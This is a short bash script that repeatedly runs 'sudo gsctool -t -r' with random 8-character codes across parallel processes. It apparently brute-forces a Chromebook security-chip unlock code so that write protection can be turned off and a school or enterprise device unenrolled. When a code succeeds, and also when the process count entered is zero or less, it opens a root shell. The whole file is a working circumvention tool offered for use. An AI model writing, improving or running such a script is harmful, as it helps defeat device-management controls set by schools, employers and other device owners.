#!/bin/bash

brutestatus=true

if grep -q "warning: script from noexec mount" "$0"; then
  echo "ignore that warning ^"
fi

read -p "How many processes should be ran? " processamount

if [ $processamount -le 0 ]; then
  echo "You must have at least 1 process."
  sudo bash
fi

generate_code() {
  characters="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  code_length=8 
  ac=""
  for ((j=0; j<code_length; j++)); do
    ac+=${characters:$((RANDOM%${#characters})):1}
  done
}

main() {
  while $brutestatus; do 
    generate_code
    echo "Trying the code $ac"
    sudo gsctool -t -r "$ac"
    if [ $? -eq 0 ]; then
      brutestatus=false
      echo "Correct code is $ac"
      sleep 1
      read -p "Press enter to continue..."
      sleep 2
      echo "Checking if WP is disabled..."
      crossystem wpsw_cur
      echo "1 = WP is enabled, 0 = WP is disabled."
      sleep 3
      echo "If WP is disabled, you may unenroll your device in this bash shell."
      sleep 3
      sudo bash
      break
    fi
  done
}

wait
for ((i=0;i<=processamount;i++)); do
    main &
done
